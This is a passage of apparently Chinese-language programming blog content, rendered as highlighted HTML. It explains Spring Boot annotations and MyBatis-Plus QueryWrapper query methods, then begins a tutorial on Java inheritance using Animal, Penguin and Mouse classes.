class="comment">// 此处通常用 @PostMapping(&quot;/user/login&quot;) 表明POST请求方式的映射，因为register注册需要向服务器提交用户数据。</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/register&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user register&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上述代码所示，到 /user/login 的请求会由 login() 方法来处理，而到 /user/register的请求会由 register() 来处理。</p><p><strong>实例B</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">// 映射到类上</span></span><br><span class="line"><span class="comment">// localhost:8080/user</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"><span class="comment">// 映射到方法上</span></span><br><span class="line"><span class="comment">// localhost:8080/user/login</span></span><br><span class="line"><span class="comment">// 此处通常用 @GetMapping(&quot;/user/login&quot;) 表明GET请求方式的映射</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/login&quot;)</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 映射到方法上</span></span><br><span class="line">    <span class="comment">// localhost:8080/user/register</span></span><br><span class="line">    <span class="comment">// 此处通常用 @PostMapping(&quot;/user/login&quot;) 表明POST请求方式的映射</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user register&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般情况下，这样代码更规范，因为user的控制器UserController只对user表进行操作。</p><h2 id="Autowired注解"><a href="#Autowired注解" class="headerlink" title="@Autowired注解"></a>@Autowired注解</h2><p>@Autowired可以标注在属性上、方法上和构造器上，来完成<strong>自动装配</strong>。默认是根据属性类型，spring自动将匹配到的属性值进行注入，然后就可以使用这个属性（对Springboot02WebApplicationTests类来说）autoWiredBean对象的方法。</p><p>它可以标注在属性上、方法上和构造器上，那有什么区别吗？简单来说因为<a href="https://so.csdn.net/so/search?q=%E7%B1%BB%E6%88%90%E5%91%98&spm=1001.2101.3001.7020">类成员</a>的初始化顺序不同，静态成员 ——&gt; 变量初始化为默认值——&gt;构造器——&gt;为变量赋值。如果标注在属性上，则在构造器中就不能使用这个属性（对象）的属性和方法。</p><p><strong>推荐：</strong> 对构造函数标注注解</p><p>直接应用于字段是我们使用的最多的一种方式，但是使用构造方法注入从代码层面却是更加好的。</p><p>当标注的属性是接口时，其实注入的是这个接口的实现类， 如果这个接口有多个实现类，只使用@Autowired就会报错，因为它默认是根据类型找，然后就会找到多个实现类bean，所有就不知道要注入哪个。然后它就会根据属性名去找。所以如果有多个实现类可以配合@Qualifier(value=“类名”)来使用 （是根据名称来进行注入的）</p><h2 id="PostMapping注解"><a href="#PostMapping注解" class="headerlink" title="@PostMapping注解"></a>@PostMapping注解</h2><p>@PostMapping注解用于处理HTTP POST请求，并将请求映射到具体的处理方法中。@PostMapping与@GetMapping一样，也是一个组合注解，它相当于是@RequestMapping(method=HttpMethod.POST)的快捷方式。</p><p>下面是使用@PostMapping的一个示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/v1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/users&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">createUser</span><span class="params">(<span class="meta">@Valid</span> <span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.save(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WebFilter注解"><a href="#WebFilter注解" class="headerlink" title="@WebFilter注解"></a>@WebFilter注解</h2><p>@WebFilter可用于将某个类设置为过滤器，该注解在tomcat的servlet包下，从servlet3.0版本就开始支持这个注解了。</p><p>该注解包含如下参数可以设置：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201048167.png"></p><table><thead><tr><th>属性名</th><th>类型</th><th>说   明</th><th>其他</th></tr></thead><tbody><tr><td><code>description</code></td><td>String</td><td>对该注解的说明</td><td></td></tr><tr><td><code>displayName</code></td><td>String</td><td>过滤器显示名，等同与<code>&lt;display-name&gt;</code></td><td></td></tr><tr><td><code>initParams</code></td><td><code>WebInitParam[]</code></td><td>用于设置该过滤器类的一些初始化参数，等同于<code>&lt;init-param&gt;</code></td><td><code>如：initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;)</code></td></tr><tr><td><code>filterName</code></td><td>String</td><td>过滤器名，等价与<code>&lt;filter-name&gt;</code></td><td></td></tr><tr><td><code>servletNames</code></td><td><code>String[]</code></td><td>String类型的数组，用于指定过滤的servlet。取值是 @WebServlet 中的 name 属性的取值，或者是 web.xml 中 <code>&lt;servlet-name&gt;</code> 的取值。</td><td></td></tr><tr><td>value，urlPatterns</td><td>String[]</td><td>过滤器的 URL 匹配模式。等价于 <code>&lt;url-pattern&gt;</code> 标签。</td><td>如： urlPatterns = {“/*”} 拦截所有，需要注意value和urlpattern只能选一个，建议urlpattern，好看些</td></tr><tr><td>dispatcherTypes</td><td>DispatcherType[]</td><td>过滤器的转发模式。具体取值包括：ASYNC、ERROR、FORWARD、INCLUDE、REQUEST。</td><td>有默认值，见上图，默认为request</td></tr><tr><td>asyncSupported</td><td>boolean</td><td>过滤器是否支持异步操作模式，等价于 <code>&lt;async-supported&gt;</code> 标签。</td><td>默认为false</td></tr></tbody></table><p>此外，被@WebFilter注解的类，会在容器启动时被加载，并进行属性配置。即项目一启动容器自动加载init方法。</p><h2 id="ServletComponentScan注解"><a href="#ServletComponentScan注解" class="headerlink" title="@ServletComponentScan注解"></a>@ServletComponentScan注解</h2><p>在SpringBootApplication上使用@ServletComponentScan注解后，Servlet、Filter、Listener可以直接通过@WebServlet、@WebFilter、@WebListener注解自动注册，无需其他代码。</p><h2 id="ComponentScan注解"><a href="#ComponentScan注解" class="headerlink" title="@ComponentScan注解"></a>@ComponentScan注解</h2><p>Spring是一个依赖注入(dependency injection)框架。所有的内容都是关于bean的定义及其依赖关系。定义Spring Beans的第一步是使用正确的注解-@Component或@Service或@Repository.<br>但是，Spring不知道你定义了某个bean除非它知道从哪里可以找到这个bean.<br>ComponentScan做的事情就是告诉Spring从哪里找到bean。</p><p>包扫描会扫描只要标注了@Controller,@Service,@Repository,@Component这四个注解都会被扫描到容器中。<br>1、@Controller 控制器（注入服务）<br>用于标注控制层，相当于struts中的action层<br>2、@Service 服务（注入dao）<br>用于标注服务层，主要用来进行业务的逻辑处理<br>3、@Repository（实现dao访问）<br>用于标注数据访问层，也可以说用于标注数据访问组件，即DAO组件.<br>4、@Component （把普通pojo实例化到spring容器中，相当于配置文件中的<bean id="" class=""/>）泛指各种组件，就是说当我们的类不属于各种归类的时候（不属于@Controller、@Service等的时候），我们就可以使用@Component来标注这个类。</p><h2 id="ResponseBody注解"><a href="#ResponseBody注解" class="headerlink" title="@ResponseBody注解"></a>@ResponseBody注解</h2><p>将Controller的方法返回的对象,通过转换器转换为指定的格式之后,写入到 Response 对象的 body 区。用来返回 JSON 数据或 XML数据 。</p><p>注意：在使用此注解之后不会再走视图处理器，而是直接将数据写入到输入流中，他的效果等同于通过 Response 对象输出指定格式的数据 。</p><h2 id="ExceptionHandler注解"><a href="#ExceptionHandler注解" class="headerlink" title="@ExceptionHandler注解"></a>@ExceptionHandler注解</h2><p>Spring的@ExceptionHandler可以用来统一处理方法抛出的异常，比如这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleExeption2</span><span class="params">(Exception ex)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;抛异常了:&quot;</span> + ex);</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">    String resultStr = <span class="string">&quot;异常：默认&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> resultStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们使用这个@ExceptionHandler注解时，我们需要定义一个异常的处理方法，比如上面的handleExeption2()方法，给这个方法加上@ExceptionHandler注解，这个方法就会处理类中其他方法（被@RequestMapping注解）抛出的异常。</p><p>@ExceptionHandler注解中可以添加参数，<strong>参数是某个异常类的class，代表这个方法专门处理该类异常</strong>，比如这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler(NumberFormatException.class)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleExeption</span><span class="params">(Exception ex)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;抛异常了:&quot;</span> + ex);</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">    String resultStr = <span class="string">&quot;异常：NumberFormatException&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> resultStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时注解的参数是NumberFormatException.class，表示只有方法抛出NumberFormatException时，才会调用该方法。</p><h2 id="Bean注解"><a href="#Bean注解" class="headerlink" title="@Bean注解"></a>@Bean注解</h2><h2 id="Mybatis-plus-LambdaQueryWrapper-模糊查询-like方法使用记录"><a href="#Mybatis-plus-LambdaQueryWrapper-模糊查询-like方法使用记录" class="headerlink" title="Mybatis-plus LambdaQueryWrapper 模糊查询 like方法使用记录"></a>Mybatis-plus LambdaQueryWrapper 模糊查询 like方法使用记录</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//条件封装</span></span><br><span class="line">QueryWrapper&lt;FykUser&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">queryWrapper.like(StringUtils.isNotBlank(user.getName()), <span class="string">&quot;NAME&quot;</span>, user.getName());</span><br><span class="line">queryWrapper.like(user.getEnable() != <span class="keyword">null</span>, <span class="string">&quot;ENABLE&quot;</span>, user.getEnable());</span><br><span class="line">List&lt;FykUser&gt; userList = userDao.selectList(queryWrapper);</span><br></pre></td></tr></table></figure><p>这里，like方法有三个参数：<br>第一个参数：<strong>该参数是一个布尔类型</strong>，只有该参数是true时，才将like条件拼接到sql中；本例中，如果name字段不为空，则拼接name字段的like查询条件；<br>第二个参数：该参数是<strong>数据库中的字段名</strong>；<br>第三个参数：<strong>该参数值字段值</strong>；<br>需要说明的是，这里的like查询是使用的默认方式，也就是说在查询条件的左右两边都有%：NAME = ‘%王%’；<br>如果只需要在左边或者右边拼接%，可以使用likeLeft或者likeRight方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">queryWrapper.lt（）——小于</span><br><span class="line">queryWrapper.le（）——小于等于</span><br><span class="line">queryWrapper.gt（）——大于</span><br><span class="line">queryWrapper.ge（）——大于等于</span><br><span class="line">queryWrapper.eq（）——等于</span><br><span class="line">queryWrapper.ne（）——不等于</span><br><span class="line">queryWrapper.betweeen（“age”,<span class="number">10</span>,<span class="number">20</span>）——age在值<span class="number">10</span>到<span class="number">20</span>之间</span><br><span class="line">queryWrapper.notBetweeen（“age”,<span class="number">10</span>,<span class="number">20</span>）——age不在值<span class="number">10</span>到<span class="number">20</span>之间</span><br><span class="line">queryWrapper.like（“属性”,“值”）——模糊查询匹配值‘%值%’</span><br><span class="line">queryWrapper.notLike（“属性”,“值”）——模糊查询不匹配值‘%值%’</span><br><span class="line">queryWrapper.likeLeft（“属性”,“值”）——模糊查询匹配最后一位值‘%值’</span><br><span class="line">queryWrapper.likeRight（“属性”,“值”）——模糊查询匹配第一位值‘值%’</span><br><span class="line">queryWrapper.isNull（）——值为空或<span class="keyword">null</span></span><br><span class="line">queryWrapper.isNotNull（）——值不为空或<span class="keyword">null</span></span><br><span class="line">queryWrapper.in（“属性”，条件，条件 ）——符合多个条件的值</span><br><span class="line">queryWrapper.notIn(“属性”，条件，条件 )——不符合多个条件的值</span><br><span class="line">queryWrapper.or（）——或者</span><br><span class="line">queryWrapper.and（）——和</span><br><span class="line">queryWrapper.orderByAsc(“属性”)——根据属性升序排序</span><br><span class="line">queryWrapper.orderByDesc(“属性”)——根据属性降序排序</span><br><span class="line">queryWrapper.inSql(“sql语句”)——符合sql语句的值</span><br><span class="line">queryWrapper.notSql(“sql语句”)——不符合SQL语句的值</span><br><span class="line">queryWrapper.esists（“SQL语句”）——查询符合SQL语句的值</span><br><span class="line">queryWrapper.notEsists（“SQL语句”）——查询不符合SQL语句的值</span><br></pre></td></tr></table></figure><h2 id="TableField注解-1"><a href="#TableField注解-1" class="headerlink" title="@TableField注解"></a>@TableField注解</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象</title>
      <link href="/2023/05/15/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2023/05/15/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承是java面向对象编程技术的一块基石，因为它允许创建分等级层次的类。</p><p>继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为。</p><h2 id="类的继承格式"><a href="#类的继承格式" class="headerlink" title="类的继承格式"></a>类的继承格式</h2><p>在 Java 中通过 extends 关键字可以申明一个类是从另外一个类继承而来的，一般形式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 父类</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 子类 <span class="keyword">extends</span> 父类</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么需要继承"><a href="#为什么需要继承" class="headerlink" title="为什么需要继承"></a>为什么需要继承</h2><p>接下来我们通过实例来说明这个需求。</p><p>开发动物类，其中动物分别为企鹅以及老鼠，要求如下：</p><ul><li>企鹅：属性（姓名，id），方法（吃，睡，自我介绍）</li><li>老鼠：属性（姓名，id），方法（吃，睡，自我介绍）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//企鹅类</span></span><br><span class="line"><span class="keyword">package</span> Object.Animal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Penguin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Penguin</span><span class="params">(String myName, <span class="keyword">int</span> myid)</span></span>&#123;</span><br><span class="line">        name = myName;</span><br><span class="line">        id = myid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">introduction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大家好！我是&quot;</span> + id + <span class="string">&quot;号&quot;</span> + name + <span class="string">&quot;。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//老鼠类</span></span><br><span class="line"><span class="keyword">package</span> Object.Animal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mouse</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Mouse</span><span class="params">(String myName, <span class="keyword">int</span> myid)</span></span>&#123;</span><br><span class="line">        name = myName;</span><br><span class="line">        id = myid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">introduction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大家好！我是&quot;</span> + id + <span class="string">&quot;号&quot;</span> + name + <span class="string">&quot;。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这两段代码可以看出来，代码存在重复了，导致后果就是代码量大且臃肿，而且维护性不高(维护性主要是后期需要修改的时候，就需要修改很多的代码，容易出错)，所以要从根本上解决这两段代码的问题，就需要继承，将两段代码中相同的部分提取出来组成一个父类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//公共父类  动物类</span></span><br><span class="line"><span class="keyword">package</span> Object.Animal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">(String myName, <span class="keyword">int</span> myid)</span></span>&#123;</span><br><span class="line">        name = myName;</span><br><span class="line">        id = myid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">introduction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大家好！我是&quot;</span> + id + <span class="string">&quot;号&quot;</span> + name + <span class="string">&quot;。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Animal类就可以作为一个父类，然后企鹅类和老鼠类继承这个类之后，就具有父类当中的属性和方法，子类就不会存在重复的代码，维护性也提高，代码也更加简洁，提高代码的复用性（复用性主要是可以多次使用，不用再多次写同样的代码）</p><p> 继承之后的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承后的企鹅类</span></span><br><span class="line"><span class="keyword">package</span> Object.Animal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Penguin</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Penguin</span><span class="params">(String myName, <span class="keyword">int</span> myid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(myName, myid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承后的老鼠类</span></span><br><span class="line"><span class="keyword">package</span> Object.Animal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mouse</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Mouse</span><span class="params">(String myName, <span class="keyword">int</span> myid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(myName, myid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h2><p>需要注意的是 Java 不支持多继承，但支持多重继承。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305161510796.png"></p><h2 id="继承的特性"><a href="#继承的特性" class="headerlink" title="继承的特性"></a>继承的特性</h2><ul><li>子类拥有父类非 private 的属性、方法。</li><li>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</li><li>子类可以用自己的方式实现父类的方法。</li><li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 B 类继承 A 类，C 类继承 B 类，所以按照关系就是 B 类是 C 类的父类，A 类是 B 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li><li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li></ul><h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p><h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 <strong>extends 只能继承一个类</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> String name;   </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">(String myName, <span class="keyword">int</span> myid)</span> </span>&#123; </span><br><span class="line">        <span class="comment">//初始化属性值</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;  <span class="comment">//吃东西方法的具体实现  &#125; </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> </span>&#123; <span class="comment">//睡觉方法的具体实现  &#125; </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Penguin</span>  <span class="keyword">extends</span>  <span class="title">Animal</span></span>&#123; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span 